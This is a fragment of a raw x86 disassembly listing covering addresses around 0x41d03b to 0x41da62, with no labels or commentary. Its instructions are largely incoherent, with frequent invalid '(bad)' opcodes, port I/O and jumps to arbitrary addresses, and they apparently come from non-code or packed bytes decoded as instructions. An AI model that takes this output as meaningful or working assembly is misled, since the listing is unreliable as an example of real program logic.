  41d03b:	shr    edi,1
  41d03d:	test   edx,eax
  41d03f:	mov    ebp,0x57b4adc7
  41d044:	jb     0x41cfcd
  41d046:	nop
  41d047:	jb     0x41d0aa
  41d049:	(bad)  
  41d04a:	int3   
  41d04b:	inc    esp
  41d04c:	shl    BYTE PTR [edx+edx*2-0x243c7573],0x2d
  41d054:	jne    0x41d03b
  41d056:	add    dl,BYTE PTR [edi-0x3c]
  41d059:	ins    BYTE PTR es:[edi],dx
  41d05a:	dec    esp
  41d05b:	rol    DWORD PTR [ecx-0x20],cl
  41d05e:	(bad)  
  41d05f:	mov    ds:0xb85aee5a,al
  41d064:	xlat   BYTE PTR ds:[ebx]
  41d065:	rcl    DWORD PTR ds:[ebx+0x57],cl
  41d069:	call   0xb42fe04a
	...
  41d0d6:	mov    ecx,0xad432034
  41d0db:	push   edi
  41d0dc:	sti    
  41d0dd:	dec    BYTE PTR [esi-0x1b]
  41d0e0:	mov    ebp,0xea0887bd
  41d0e5:	xchg   ecx,eax
  41d0e6:	cmp    BYTE PTR [bx+di],al
  41d0e9:	add    BYTE PTR [eax],al
  41d0eb:	add    DWORD PTR [eax],eax
  41d0ed:	add    ah,cl
  41d0ef:	cmovs  edi,DWORD PTR [eax+0x34c940c1]
  41d0f6:	sub    DWORD PTR [ecx+edx*4-0x437c4c94],0x9b079bd2
  41d101:	faddp  st(3),st
  41d103:	add    bh,BYTE PTR [edx+edi*2]
  41d106:	ins    BYTE PTR es:[edi],dx
  41d107:	cdq    
  41d108:	mov    ?,WORD PTR [ecx-0x21]
  41d10b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d10c:	pop    ss
  41d10d:	or     al,BYTE PTR [eax-0x1a]
  41d110:	mov    al,0x35
  41d112:	sub    DWORD PTR [esi+eax*8+0x4e57e9a2],ebx
  41d119:	int    0x2b
  41d11b:	mov    ebp,DWORD PTR [eax+0x73]
  41d11e:	jns    0x41d114
  41d120:	pop    ecx
  41d121:	bound  ecx,QWORD PTR [eax+0x42d127db]
  41d127:	xchg   ecx,eax
  41d128:	or     ah,BYTE PTR [esi-0x1a]
  41d12b:	inc    ecx
  41d12c:	sbb    ecx,DWORD PTR [ebp+0x36]
  41d12f:	out    0x8d,al
  41d131:	cmp    edx,DWORD PTR cs:[ebx+0x6f]
  41d135:	ds stos BYTE PTR es:[edi],al
  41d137:	jl     0x41d194
  41d139:	mov    ebp,0x850d7709
  41d13e:	lds    esp,FWORD PTR [ecx+0x7c5d4502]
  41d144:	or     eax,0x2ccda5c9
  41d149:	and    ebp,DWORD PTR [ecx-0x55]
  41d14c:	inc    esp
  41d14d:	inc    edi
  41d14e:	aaa    
  41d14f:	sub    bh,dl
  41d151:	(bad)  
  41d153:	lods   eax,DWORD PTR ds:[esi]
  41d154:	inc    ebx
  41d155:	and    al,0x1f
  41d157:	fucomi st,st(0)
  41d159:	pop    eax
  41d15a:	sub    eax,0x5615d3df
  41d15f:	dec    eax
  41d160:	mov    edx,0x8f38f5cb
  41d165:	pop    ss
  41d166:	mov    al,0x44
  41d168:	sbb    edx,esi
  41d16a:	sete   BYTE PTR [edi+0x655a793b]
  41d171:	mov    ds:0xdd82dc14,eax
  41d176:	scas   eax,DWORD PTR es:[edi]
  41d177:	xchg   WORD PTR ds:0xd67bec5c,bx
  41d17e:	mov    ds:0x2bdcda0f,eax
  41d183:	cwde   
  41d184:	sar    edx,0xc3
  41d187:	cmp    eax,DWORD PTR ds:0x6123d327
  41d18d:	loope  0x41d14a
  41d18f:	mov    eax,ds:0x5ef85c6b
  41d194:	adc    al,0xdb
  41d196:	cmp    eax,0xf3867d0b
  41d19b:	inc    ebp
  41d19c:	cli    
  41d19d:	sahf   
  41d19e:	ins    BYTE PTR es:[edi],dx
  41d19f:	adc    edx,DWORD PTR [ebx-0x31]
  41d1a2:	push   es
  41d1a3:	adc    bl,BYTE PTR [esp+eiz*8+0x5281493]
  41d1aa:	mov    bl,0x88
  41d1ac:	jo     0x41d1c7
  41d1ae:	jo     0x41d1fb
  41d1b0:	aad    0xc
  41d1b2:	into   
  41d1b3:	mov    eax,ds:0x2cbe0e7a
  41d1b8:	fwait
  41d1b9:	push   edi
  41d1ba:	mov    bl,0x81
  41d1bc:	and    ebx,DWORD PTR [esi-0x2]
  41d1bf:	cs adc eax,0xa26b1685
  41d1c5:	imul   ebp,DWORD PTR [esi-0x51a8c2a8],0xd2be85b
  41d1cf:	add    dl,0x62
  41d1d2:	cmp    eax,0xc6939783
  41d1d7:	adc    cl,ch
  41d1d9:	mov    al,ds:0xa51c7111
  41d1de:	sub    eax,0xaf1ab38d
  41d1e3:	cmp    cl,cl
  41d1e5:	outs   dx,DWORD PTR ds:[esi]
  41d1e6:	gs mov esi,0xe056bc2c
  41d1ec:	adc    al,0x25
	...
  41d256:	push   eax
  41d257:	ret    
  41d258:	cmp    ecx,DWORD PTR ds:0xdf76fdbb
  41d25e:	xor    DWORD PTR [ebp-0x7],esp
  41d261:	hlt    
  41d262:	cmp    DWORD PTR [edi+0x22],edi
  41d265:	pop    edi
  41d266:	cmp    DWORD PTR [bx+di],eax
  41d269:	add    BYTE PTR [eax],al
  41d26b:	add    DWORD PTR [eax],eax
  41d26d:	add    bh,ch
  41d26f:	inc    edx
  41d270:	push   edi
  41d271:	imul   ebx,edi,0x2325c3dc
  41d277:	call   0xb4776406
  41d27c:	sbb    eax,0x8f8af02
  41d281:	add    eax,0xa5a44488
  41d286:	stos   DWORD PTR es:[edi],eax
  41d287:	sbb    DWORD PTR [esi],edi
  41d289:	xor    dh,BYTE PTR [ebx+0x1f5fca82]
  41d28f:	(bad)  
  41d290:	cmp    BYTE PTR [ecx-0x45],ah
  41d293:	mov    edi,0xa270e421
  41d298:	jno    0x41d24e
  41d29a:	aas    
  41d29b:	mov    esi,0xcfc5092e
  41d2a0:	loopne 0x41d30a
  41d2a2:	sub    eax,0xd00a9779
  41d2a7:	(bad)  
  41d2a8:	cmp    eax,0x7469122d
  41d2ad:	mov    edx,0x6f1c8a20
  41d2b2:	call   0xb4dee670
  41d2b7:	ret    
  41d2b8:	xacquire xchg BYTE PTR [eax+0xd],cl
  41d2bc:	adc    ebx,ebp
  41d2be:	cld    
  41d2bf:	jbe    0x41d25b
  41d2c1:	hlt    
  41d2c2:	inc    eax
  41d2c3:	sub    eax,DWORD PTR [edi+0x31]
  41d2c6:	repz xor esi,DWORD PTR [ebx]
  41d2c9:	jno    0x41d24f
  41d2cb:	push   esi
  41d2cc:	mov    eax,ds:0x1576c94a
  41d2d1:	xlat   BYTE PTR ds:[ebx]
  41d2d2:	cmp    bl,0x10
  41d2d5:	xor    al,0x88
  41d2d7:	or     eax,0x8f7f4ebe
  41d2dc:	and    al,0x74
  41d2de:	mov    WORD PTR [esi-0x69a36550],ds
  41d2e4:	or     ah,0xfe
  41d2e7:	add    DWORD PTR [edi+0x0],esi
  41d2ea:	or     eax,0x8a95b4a8
  41d2ef:	push   es
  41d2f0:	push   esp
  41d2f1:	mov    bl,bh
  41d2f3:	cmp    al,0x9a
  41d2f5:	push   cs
  41d2f6:	lods   al,BYTE PTR ds:[esi]
  41d2f7:	out    0xdf,eax
  41d2f9:	mov    ebx,0xf8ea9ecc
  41d2fe:	ror    DWORD PTR [edi],cl
  41d300:	fiadd  WORD PTR [eax+0x32]
  41d303:	sbb    dh,bl
  41d305:	mov    ebx,DWORD PTR [esp+ecx*8]
  41d308:	pop    esi
  41d309:	or     al,BYTE PTR [edi+0x3dcd2f78]
  41d30f:	jo     0x41d339
  41d311:	mov    esp,0xdad6aeff
  41d316:	jmp    0x41d317
  41d318:	xchg   ecx,eax
  41d319:	mov    dh,BYTE PTR [eax-0x3]
  41d31c:	dec    eax
  41d31d:	fnstcw WORD PTR [eax]
  41d31f:	test   BYTE PTR [ecx+edi*4],ah
  41d322:	mov    BYTE PTR [ecx-0x76],ch
  41d325:	gs xchg esi,eax
  41d327:	sub    DWORD PTR [edi-0x7d],ebx
  41d32a:	push   cs
  41d32b:	nop
  41d32c:	test   BYTE PTR [esi-0x6d],dl
  41d32f:	pop    esi
  41d330:	xor    eax,0xf83ab8ac
  41d335:	or     BYTE PTR [ebx+0x25],bl
  41d338:	test   DWORD PTR [edx+0x2a4be1e9],eax
  41d33e:	sub    esi,DWORD PTR [ebx+0x26]
  41d341:	mov    ecx,0xa5e7086f
  41d346:	ret    0xd258
  41d349:	cmc    
  41d34a:	in     eax,dx
  41d34b:	scas   al,BYTE PTR es:[edi]
  41d34c:	inc    edi
  41d34d:	jb     0x41d2f6
  41d34f:	pop    ds
  41d350:	cld    
  41d351:	nop
  41d352:	stos   BYTE PTR es:[edi],al
  41d353:	push   esi
  41d354:	xchg   esi,eax
  41d355:	shl    dh,0xd8
  41d358:	mov    esi,0x2d973fd6
  41d35d:	out    0x8c,eax
  41d35f:	add    ch,bl
  41d361:	adc    al,0x67
  41d363:	adc    BYTE PTR [edi+0x30],ah
  41d366:	stos   BYTE PTR es:[edi],al
  41d367:	repz popa 
  41d369:	dec    ebx
  41d36a:	add    al,0x23
  41d36c:	sub    al,0x5e
	...
  41d3d6:	inc    BYTE PTR [eax+0x7dff54f9]
  41d3dc:	jmp    FWORD PTR [edx+0x69c02f8d]
  41d3e2:	gs adc eax,0x3a67c922
  41d3e8:	add    DWORD PTR [eax],eax
  41d3ea:	add    BYTE PTR [ecx],al
  41d3ec:	add    BYTE PTR [eax],al
  41d3ee:	rcl    bl,0x82
  41d3f1:	jge    0x41d3c0
  41d3f3:	adc    dh,al
  41d3f5:	cmc    
  41d3f6:	or     bl,BYTE PTR [edx]
  41d3f8:	outs   dx,BYTE PTR ds:[esi]
  41d3f9:	or     BYTE PTR [edx],cl
  41d3fb:	lahf   
  41d3fc:	mov    edi,0x974b62c0
  41d401:	cs dec esi
  41d403:	mov    al,bl
  41d405:	imul   DWORD PTR [edx-0x5728e63]
  41d40b:	jbe    0x41d3d5
  41d40d:	dec    DWORD PTR [edx-0x2f]
  41d410:	push   ecx
  41d411:	mov    eax,0xb94aa31a
  41d416:	ret    
  41d417:	sub    DWORD PTR [edx-0x68],edi
  41d41a:	mov    bh,0xcf
  41d41c:	jbe    0x41d407
  41d41e:	sbb    ah,BYTE PTR [esi*2-0x1e7d9b1f]
  41d425:	out    0x89,al
  41d427:	clc    
  41d428:	jns    0x41d476
  41d42a:	les    edi,FWORD PTR [edx+0x51]
  41d42d:	pop    ecx
  41d42e:	push   edi
  41d42f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d430:	pop    edx
  41d431:	loopne 0x41d437
  41d433:	div    DWORD PTR [eax-0x1917863]
  41d439:	ds ss push ebp
  41d43c:	xlat   BYTE PTR ds:[ebx]
  41d43d:	and    al,0x2
  41d43f:	lock mov edi,0x2153b279
  41d445:	push   esi
  41d446:	pop    edx
  41d447:	xor    DWORD PTR [ebx],ecx
  41d449:	aas    
  41d44a:	jb     0x41d3e2
  41d44c:	adc    al,0x10
  41d44e:	xlat   BYTE PTR ds:[ebx]
  41d44f:	mov    bl,0x49
  41d451:	xor    eax,0xbabcea2
  41d456:	dec    esp
  41d457:	mov    eax,ds:0x58e538e7
  41d45c:	bound  edi,QWORD PTR [ecx+0x46c8466b]
  41d462:	adc    BYTE PTR [ebx],0x48
  41d465:	(bad)  
  41d466:	cmp    al,BYTE PTR [ebp+edx*2+0x5ab25d54]
  41d46d:	push   edx
  41d46e:	(bad)  
  41d46f:	fsub   st(5),st
  41d471:	jle    0x41d463
  41d473:	cmp    al,0xba
  41d475:	ins    BYTE PTR es:[edi],dx
  41d476:	aam    0x15
  41d478:	fidiv  DWORD PTR [ebx]
  41d47a:	xchg   ecx,eax
  41d47b:	add    DWORD PTR [esi+0x67],eax
  41d47e:	repz adc eax,0x688b97fa
  41d484:	shr    BYTE PTR [edi+0x12],0xec
  41d488:	daa    
  41d489:	outs   dx,BYTE PTR es:[si]
  41d48c:	xchg   esp,eax
  41d48d:	repz jae 0x41d47d
  41d490:	fstp   DWORD PTR [ebx]
  41d492:	pop    edi
  41d493:	div    BYTE PTR [ecx+0x1affb627]
  41d499:	addr16 mov dh,0xe1
  41d49c:	das    
  41d49d:	sbb    eax,0x875e4878
  41d4a2:	enter  0xab25,0x3b
  41d4a6:	data16 (bad) 
  41d4a8:	xchg   edi,eax
  41d4a9:	rcl    DWORD PTR [ebx+0x70],1
  41d4ac:	daa    
  41d4ad:	outs   dx,DWORD PTR ds:[esi]
  41d4ae:	mov    DWORD PTR [ecx-0x659b52c7],ebx
  41d4b4:	xchg   ebp,eax
  41d4b5:	inc    ebx
  41d4b6:	fst    DWORD PTR [ecx]
  41d4b8:	cld    
  41d4b9:	dec    eax
  41d4ba:	fdivr  DWORD PTR [eax+0x7adc9296]
  41d4c0:	(bad)
  41d4c5:	je     0x41d48c
  41d4c7:	les    edx,FWORD PTR [edx+edi*8-0x58]
  41d4cb:	ins    BYTE PTR es:[edi],dx
  41d4cc:	and    ecx,ecx
  41d4ce:	push   0x3c2ba274
  41d4d3:	ins    DWORD PTR es:[edi],dx
  41d4d4:	pop    es
  41d4d5:	sahf   
  41d4d6:	inc    eax
  41d4d7:	test   DWORD PTR [ebx],0x618f4526
  41d4dd:	(bad)  
  41d4de:	jmp    0x6d93be82
  41d4e3:	repnz xchg ebp,eax
  41d4e5:	test   edx,ebp
  41d4e7:	shl    BYTE PTR [esi],1
  41d4e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d4ea:	lock ins DWORD PTR es:[edi],dx
  41d4ec:	nop
  41d4ed:	fadd   DWORD PTR [eax]
	...
  41d553:	add    BYTE PTR [eax],al
  41d555:	add    dh,dh
  41d557:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d55f:	nop
  41d560:	call   0x6725:0x28c47189
  41d567:	cmp    eax,DWORD PTR [ecx]
  41d569:	add    BYTE PTR [eax],al
  41d56b:	add    DWORD PTR [eax],eax
  41d56d:	add    BYTE PTR [edi],bl
  41d56f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d570:	ret    0x63e7
  41d573:	jge    0x41d5e5
  41d575:	ins    BYTE PTR es:[edi],dx
  41d576:	in     al,dx
  41d577:	xchg   esi,eax
  41d578:	(bad)  [eax]
  41d57a:	mov    edx,0x7591e7da
  41d57f:	pop    ebp
  41d580:	lods   eax,DWORD PTR ds:[esi]
  41d581:	push   ds
  41d582:	add    dl,BYTE PTR [ecx+ebp*4+0x21cc5427]
  41d589:	mov    eax,DWORD PTR [esi+edi*2-0x1f04a01]
  41d590:	and    edi,DWORD PTR [esi-0xd]
  41d593:	push   esp
  41d594:	adc    edx,edi
  41d596:	pop    ebx
  41d597:	and    eax,0x648f6784
  41d59c:	dec    ebp
  41d59d:	dec    edi
  41d59e:	int    0xec
  41d5a0:	pop    ecx
  41d5a1:	jecxz  0x41d5c5
  41d5a3:	sub    BYTE PTR [eax+0x539b983],dl
  41d5a9:	mov    WORD PTR [edx-0x4d],?
  41d5ac:	out    0xf,al
  41d5ae:	call   0x8fc77a5a
  41d5b3:	fdiv   QWORD PTR [ecx]
  41d5b5:	or     DWORD PTR [esi+0x4611290b],eax
  41d5bb:	repz shr DWORD PTR [edx-0x43804341],cl
  41d5c2:	loop   0x41d5ec
  41d5c4:	test   al,0x71
  41d5c6:	sbb    ah,BYTE PTR [esi+0x29]
  41d5c9:	xchg   ebx,eax
  41d5ca:	jmp    0xbf62be77
  41d5cf:	jnp    0x41d5f0
  41d5d1:	add    BYTE PTR [eax],0xa0
  41d5d4:	push   ds
  41d5d5:	pop    ds
  41d5d6:	mov    ebp,0x828f4992
  41d5db:	inc    esp
  41d5dc:	add    bh,0xba
  41d5df:	sub    edi,ebp
  41d5e1:	xchg   edi,eax
  41d5e2:	adc    ebp,esp
  41d5e4:	sti    
  41d5e5:	inc    edx
  41d5e6:	xchg   ebp,eax
  41d5e7:	dec    edx
  41d5e8:	pop    ecx
  41d5e9:	jmp    0x41d59d
  41d5eb:	sti    
  41d5ec:	cmp    cl,BYTE PTR [eax+0x596cc2bb]
  41d5f2:	std    
  41d5f3:	mov    al,0x78
  41d5f5:	and    BYTE PTR [eax-0x6a9fa37c],0x21
  41d5fc:	mov    DWORD PTR [edi+0x66613815],eax
  41d602:	fstp   QWORD PTR [ebp+0x79]
  41d605:	dec    BYTE PTR [ebx]
  41d607:	or     al,0xe5
  41d609:	xchg   edx,eax
  41d60a:	hlt    
  41d60b:	push   esp
  41d60c:	jne    0x41d5c3
  41d60e:	xchg   ebx,eax
  41d60f:	repz xstore-rng (bad)
  41d611:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d612:	add    DWORD PTR [ecx-0xd48e04a],esi
  41d618:	xchg   ecx,eax
  41d619:	cmc    
  41d61a:	inc    esp
  41d61b:	addr16 fs mov ebx,eax
  41d61f:	sub    eax,0xe9c1591c
  41d624:	retf   
  41d625:	and    ecx,edi
  41d627:	stos   BYTE PTR es:[edi],al
  41d628:	(bad)  
  41d629:	(bad)  
  41d62b:	cmc    
  41d62c:	pop    eax
  41d62d:	in     al,0x76
  41d62f:	push   ds
  41d630:	adc    ebx,esi
  41d632:	pop    ecx
  41d633:	ss mov esi,0x6f8f8ba
  41d639:	push   edi
  41d63a:	dec    esp
  41d63b:	fild   QWORD PTR ds:0x12d372fc
  41d641:	pop    es
  41d642:	dec    eax
  41d643:	dec    edx
  41d644:	sub    DWORD PTR [edi+0x22],edx
  41d647:	lock add cl,BYTE PTR [ebx-0x1d5b2d89]
  41d64e:	(bad)  
  41d64f:	retf   
  41d650:	push   es
  41d651:	jecxz  0x41d5dd
  41d653:	scas   al,BYTE PTR es:[edi]
  41d654:	mov    ds:0x2e34e2f7,al
  41d659:	push   ebx
  41d65a:	mov    bh,0xb6
  41d65c:	test   DWORD PTR [ecx],0x965678a0
  41d662:	fs cs mov bl,0x28
  41d666:	sti    
  41d667:	cmp    BYTE PTR ds:0x743d3baf,0x4b
	...
  41d6d6:	jl     0x41d671
  41d6d8:	dec    esp
  41d6d9:	jbe    0x41d6c8
  41d6db:	idiv   DWORD PTR [esi-0x65]
  41d6de:	or     eax,0xa966e435
  41d6e3:	cmp    cl,ah
  41d6e5:	hlt    
  41d6e6:	addr16 cmp al,0x1
  41d6e9:	add    BYTE PTR [eax],al
  41d6eb:	add    DWORD PTR [eax],eax
  41d6ed:	add    cl,al
  41d6ef:	shl    DWORD PTR [edi+ebx*2-0x587b965],0xae
  41d6f7:	in     al,dx
  41d6f8:	outs   dx,DWORD PTR ds:[esi]
  41d6f9:	das    
  41d6fa:	outs   dx,BYTE PTR es:[esi]
  41d6fc:	not    al
  41d6fe:	xchg   ecx,eax
  41d6ff:	ins    BYTE PTR es:[edi],dx
  41d700:	push   ebx
  41d701:	and    BYTE PTR [esi],bl
  41d703:	fnstenv [ebx+0x2e036643]
  41d709:	clc    
  41d70a:	mov    ?,edi
  41d70c:	add    eax,0x29f95b29
  41d711:	test   BYTE PTR [esi],bl
  41d713:	mov    es,edx
  41d715:	dec    edi
  41d716:	es jno 0x41d793
  41d719:	pop    ecx
  41d71a:	jnp    0x41d727
  41d71c:	dec    eax
  41d71d:	mov    ds,WORD PTR [edi-0x17e7d0a9]
  41d723:	push   edi
  41d724:	sbb    ah,BYTE PTR [edi-0x578d6410]
  41d72a:	xchg   edi,eax
  41d72b:	test   DWORD PTR [eax+eiz*8],0x2827b80b
  41d732:	adc    ebp,DWORD PTR [ebp+0xd0f9216]
  41d738:	pop    ss
  41d739:	sbb    BYTE PTR [ebx+0x3e],dh
  41d73c:	cmp    eax,0x49b73bae
  41d741:	fnstenv [edx-0x546573d3]
  41d747:	and    esi,DWORD PTR [ebp-0x254b2883]
  41d74d:	pop    esp
  41d74e:	jb     0x41d77a
  41d750:	daa    
  41d751:	in     al,0x6f
  41d753:	jne    0x41d75c
  41d755:	adc    eax,DWORD PTR ds:0xf18e89e3
  41d75b:	inc    ebx
  41d75c:	out    dx,eax
  41d75d:	sbb    eax,0x213f4163
  41d762:	mov    esi,0xf5210180
  41d767:	or     eax,0x5bd910e7
  41d76c:	mov    dl,0x64
  41d76e:	scas   al,BYTE PTR es:[edi]
  41d76f:	and    al,0xc4
  41d771:	push   esp
  41d772:	mov    edi,0x7e994b5a
  41d777:	jb     0x41d743
  41d779:	and    al,0xff
  41d77b:	xchg   ebp,eax
  41d77c:	cmp    bl,cl
  41d77e:	sbb    DWORD PTR [ebx],0x36
  41d781:	aas    
  41d782:	bound  esp,QWORD PTR [edi+0x6e]
  41d785:	mov    edi,0x4cdf17c0
  41d78a:	outs   dx,DWORD PTR ds:[esi]
  41d78b:	fstp   st(2)
  41d78d:	jmp    0x7463:0xfc86639e
  41d794:	mov    cs,WORD PTR [edx]
  41d796:	dec    ebp
  41d797:	pop    ecx
  41d798:	jne    0x41d7c9
  41d79a:	push   cs
  41d79b:	inc    esi
  41d79c:	inc    ebp
  41d79d:	fwait
  41d79e:	nop
  41d79f:	pop    ecx
  41d7a0:	cs pop edx
  41d7a2:	mov    ds:0x3535faac,eax
  41d7a7:	dec    esp
  41d7a8:	iret   
  41d7a9:	pop    ebp
  41d7aa:	call   0xa38a:0x94e0e255
  41d7b1:	ret    
  41d7b2:	ins    DWORD PTR es:[edi],dx
  41d7b3:	(bad)  
  41d7b4:	test   BYTE PTR [ebx+0x6a4f3720],0xf
  41d7bb:	xchg   DWORD PTR [edi+0x6247d0b9],edi
  41d7c1:	mov    ebx,0xce8b997a
  41d7c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d7c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d7c9:	imul   esp,esi,0x71b858d1
  41d7cf:	add    al,0xdf
  41d7d1:	push   cs
  41d7d2:	(bad)  
  41d7d3:	dec    ebp
  41d7d4:	push   edi
  41d7d5:	sub    al,0x1e
  41d7d7:	ror    BYTE PTR [esi+0x71],1
  41d7da:	push   ebx
  41d7db:	push   ecx
  41d7dc:	iret   
  41d7dd:	add    bl,bl
  41d7df:	pop    ebp
  41d7e0:	xor    ebx,DWORD PTR [eax]
  41d7e2:	or     eax,0x71d41a8d
  41d7e7:	cmp    edi,DWORD PTR [ecx+ecx*8-0xd594476]
	...
  41d856:	and    al,0xce
  41d858:	outs   dx,BYTE PTR ds:[esi]
  41d859:	sub    ch,dh
  41d85b:	stos   BYTE PTR es:[edi],al
  41d85c:	fs into 
  41d85e:	jmp    0x41d7eb
  41d860:	leave  
  41d861:	aas    
  41d862:	(bad)  ds:0x3d6742df
  41d868:	add    DWORD PTR [eax],eax
  41d86a:	add    BYTE PTR [ecx],al
  41d86c:	add    BYTE PTR [eax],al
  41d86e:	cmp    al,0xa
  41d870:	test   DWORD PTR [ebx+0x5c],ebx
  41d873:	mov    cl,0x68
  41d875:	ret    0xeda2
  41d878:	xchg   BYTE PTR [ebx],bh
  41d87a:	enter  0x9cd3,0x70
  41d87e:	push   ebx
  41d87f:	push   edx
  41d880:	jle    0x41d848
  41d882:	inc    eax
  41d883:	cwde   
  41d884:	and    cl,dh
  41d886:	scas   al,BYTE PTR es:[edi]
  41d887:	popf   
  41d888:	test   al,0x1c
  41d88a:	ret    
  41d88b:	ret    
  41d88c:	mov    al,0x75
  41d88e:	mov    DWORD PTR [edi],ecx
  41d890:	push   eax
  41d891:	es jg  0x41d87b
  41d894:	adc    al,bh
  41d896:	jnp    0x41d907
  41d898:	push   eax
  41d899:	mov    esi,0xef6ff6b4
  41d89e:	xor    eax,0xb3529ba3
  41d8a3:	lds    esi,FWORD PTR [ebx+ebx*8+0xd]
  41d8a7:	stos   BYTE PTR es:[edi],al
  41d8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8a9:	cld    
  41d8aa:	add    DWORD PTR [esp+ecx*4+0x9],0x6c
  41d8af:	or     bh,BYTE PTR ds:0xe2362234
  41d8b5:	inc    ecx
  41d8b6:	push   ebx
  41d8b7:	inc    ebp
  41d8b8:	xchg   DWORD PTR [ecx+0x4ccc47eb],edi
  41d8be:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41d8c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d8c1:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d8c3:	rcr    DWORD PTR [eax+0x2d],0xc1
  41d8c7:	mov    eax,ds:0xb74cacae
  41d8cc:	out    0x18,eax
  41d8ce:	sub    bh,BYTE PTR [eax]
  41d8d0:	call   0x4cfc0df0
  41d8d5:	sub    ecx,DWORD PTR [ecx-0x77cb10f9]
  41d8db:	sub    al,0x6e
  41d8dd:	repnz push esp
  41d8df:	addr16 push edi
  41d8e1:	mov    bh,0xc8
  41d8e3:	add    BYTE PTR [esi-0x36],al
  41d8e6:	(bad)  
  41d8e7:	fidiv  WORD PTR [edi+ecx*2]
  41d8ea:	outs   dx,BYTE PTR ds:[esi]
  41d8eb:	jmp    0x41d953
  41d8ed:	daa    
  41d8ee:	ins    DWORD PTR es:[edi],dx
  41d8ef:	cwde   
  41d8f0:	loope  0x41d93b
  41d8f2:	mov    ecx,0x903fba05
  41d8f7:	push   ebx
  41d8f8:	add    al,0x99
  41d8fa:	lods   al,BYTE PTR ds:[esi]
  41d8fb:	sbb    dh,cl
  41d8fd:	pop    es
  41d8fe:	add    al,BYTE PTR [edi-0x7f]
  41d901:	dec    edi
  41d902:	dec    ebp
  41d903:	pop    esi
  41d904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d905:	mov    al,0x1e
  41d907:	jecxz  0x41d8c6
  41d909:	push   edx
  41d90a:	add    al,0x44
  41d90c:	ret    
  41d90d:	les    eax,FWORD PTR [esp+ecx*2]
  41d910:	jl     0x41d953
  41d912:	ret    0xd1fe
  41d915:	test   BYTE PTR [esi+0x4],dh
  41d918:	test   eax,0xd3ddd641
  41d91d:	sti    
  41d91e:	out    0xc3,eax
  41d920:	fcom   DWORD PTR [edx-0x7]
  41d923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d924:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d925:	dec    edx
  41d926:	lds    edx,FWORD PTR [edx-0xc]
  41d929:	xor    dh,al
  41d92b:	dec    eax
  41d92c:	or     dh,BYTE PTR [esp+eiz*4-0x30]
  41d930:	or     DWORD PTR [edx-0x7db3b0ce],ebp
  41d936:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d937:	stc    
  41d938:	aad    0x38
  41d93a:	add    bh,BYTE PTR [ecx+0xc]
  41d93d:	add    BYTE PTR [edx],bl
  41d93f:	jnp    0x41d9a6
  41d941:	mov    bh,0x7e
  41d943:	mov    bl,0xd2
  41d945:	or     esi,DWORD PTR [eax]
  41d947:	pop    ecx
  41d948:	call   0x48c8499
  41d94d:	lock fisttp QWORD PTR [ebx+0x3d]
  41d952:	popf   
  41d953:	sbb    al,0x85
  41d955:	es les esi,FWORD PTR ds:[edx-0x51]
  41d95a:	pusha  
  41d95b:	adc    DWORD PTR [edx-0x6c37e7d8],ecx
  41d961:	jo     0x41d8e9
  41d963:	cs pop ebx
  41d965:	inc    esp
  41d966:	repnz sbb bh,0xba
  41d96a:	inc    edx
  41d96b:	mov    cl,0x28
  41d96d:	mov    eax,0x0
	...
  41d9d6:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d9da:	scas   eax,DWORD PTR es:[edi]
  41d9db:	(bad)  
  41d9dc:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	gs loop 0x41d964
  41d9e4:	mov    eax,DWORD PTR [ecx+0x67]
  41d9e7:	add    DWORD PTR ds:[eax],eax
  41d9ea:	add    BYTE PTR [ecx],al
  41d9ec:	add    BYTE PTR [eax],al
  41d9ee:	add    DWORD PTR ds:0x8526efc3,esp
  41d9f4:	xor    esi,eax
  41d9f6:	(bad)  [esi+0x53]
  41d9f9:	out    dx,al
  41d9fa:	ss jle 0x41da6d
  41d9fd:	jb     0x41d986
  41d9ff:	dec    ebp
  41da00:	daa    
  41da01:	stos   BYTE PTR es:[edi],al
  41da02:	add    DWORD PTR [edx+0x75],esi
  41da05:	and    al,0xb0
  41da07:	icebp  
  41da08:	mov    ah,0x6d
  41da0a:	or     DWORD PTR [edx+0x13],0x7d
  41da0e:	adc    esi,esi
  41da10:	pop    es
  41da11:	test   BYTE PTR [eax-0x60099140],0x73
  41da18:	mov    eax,0x71597d17
  41da1d:	sbb    eax,0xe51c24d8
  41da22:	pop    edx
  41da23:	stos   DWORD PTR es:[edi],eax
  41da24:	sub    eax,0xbd68691f
  41da29:	icebp  
  41da2a:	cmp    BYTE PTR [ebx-0x6],0x1c
  41da2e:	xchg   ebx,eax
  41da2f:	push   cs
  41da30:	pop    esp
  41da31:	pop    edx
  41da32:	out    0xa3,al
  41da34:	xor    cl,BYTE PTR [edi-0x31]
  41da37:	ror    DWORD PTR [ecx-0x1e7ddd22],cl
  41da3d:	pop    es
  41da3e:	ss mov esp,esp
  41da41:	add    bl,BYTE PTR [edi+0x32]
  41da44:	inc    edx
  41da45:	sbb    al,0x28
  41da47:	lods   eax,DWORD PTR ds:[esi]
  41da48:	mov    esi,0xe35c2705
  41da4d:	pusha  
  41da4e:	xchg   esi,eax
  41da4f:	adc    BYTE PTR es:[eax-0x57],ch
  41da53:	dec    ebx
  41da54:	cwde   
  41da55:	pop    esp
  41da56:	out    0xb9,eax
  41da58:	scas   al,BYTE PTR es:[edi]
  41da59:	imul   eax,ecx,0x2e686182
  41da5f:	inc    ebx
  41da60:	jecxz  0x41dabe
  41da62:	jl     0x41da31
